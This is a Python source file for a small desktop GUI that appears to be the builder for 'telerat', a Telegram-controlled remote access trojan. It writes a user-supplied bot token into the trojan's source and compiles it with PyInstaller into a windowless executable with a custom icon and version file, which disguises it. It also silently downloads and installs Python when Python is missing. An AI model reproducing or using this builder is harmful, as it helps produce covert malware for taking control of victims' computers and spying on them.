import os

os.system('python --version >> temp.txt')
check = open('temp.txt','r').read()

if 'Python' in check:
    pass
else:
    os.system('curl -s https://www.python.org/ftp/python/3.9.6/python-3.9.6-amd64.exe --output python.exe')
    os.system('python.exe /quiet InstallAllUsers=1 PrependPath=1 Include_test=0 SimpleInstall=1')
    os.remove('python.exe')
    os.system('pip install -r Source_Files/requirements.txt')
os.remove('temp.txt')

from shutil import copyfile
from flaskwebgui import FlaskUI
from flask import Flask, render_template, request

app = Flask(__name__)

@app.route('/')
def welcome():
    return render_template("Build.html")

@app.route('/build',methods=['POST','GET'])
def output():
    start(request.form['key'])
    return render_template("Built.html")

def start(bot_token):
        with open('Source_Files/telerat.py', 'r') as file :
            filedata = file.read()
        if 'ENTER_YOUR_BOT_TOKEN_HERE' in filedata:
            filedata = filedata.replace('ENTER_YOUR_BOT_TOKEN_HERE',bot_token)
        with open('Source_Files/telerat.py', 'w') as file:
            file.write(filedata)


        os.system('pyinstaller --onefile --icon=Source_Files/icon.ico --version-file Source_Files/version.txt --noconsole Source_Files/telerat.py')
        os.system('rd /s /q build')
        os.remove('telerat.spec')
        copyfile('dist/telerat.exe', 'telerat.exe')
        os.system('rd /s /q dist')


        with open('Source_Files/telerat.py', 'r') as file :
            filedata = file.read()
        if bot_token in filedata:
            filedata = filedata.replace(bot_token,'ENTER_YOUR_BOT_TOKEN_HERE')
        with open('Source_Files/telerat.py', 'w') as file:
            file.write(filedata)

if __name__ == '__main__':
    FlaskUI(app, width=360, height=590).run()
